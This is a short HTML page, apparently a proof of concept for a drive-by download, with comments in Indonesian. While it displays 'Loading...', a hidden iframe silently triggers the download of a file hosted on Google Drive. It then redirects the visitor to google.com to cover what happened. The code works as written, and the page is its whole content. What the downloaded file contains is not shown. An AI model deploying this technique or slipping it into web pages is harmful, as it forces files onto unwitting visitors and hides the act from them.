<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Download Test (iframe inline)</title>
</head>
<body>

<h3>Loading...</h3>

<script>
// Buat iframe secara dinamis
const iframe = document.createElement("iframe");

// Sembunyikan iframe
iframe.style.display = "none";

// Isi iframe (POC kamu dimasukkan ke srcdoc)
iframe.srcdoc = `
<!DOCTYPE html>
<html>
<body>
<script>
function start() {
    const file = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";

    const a = document.createElement("a");
    a.href = file;
    a.download = "";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    setTimeout(() => {
        window.top.location.href = "http://google.com/";
    }, 2000);
}
start();
<\/script>
</body>
</html>
`;

// Masukkan iframe ke halaman
document.body.appendChild(iframe);
</script>

</body>
</html>
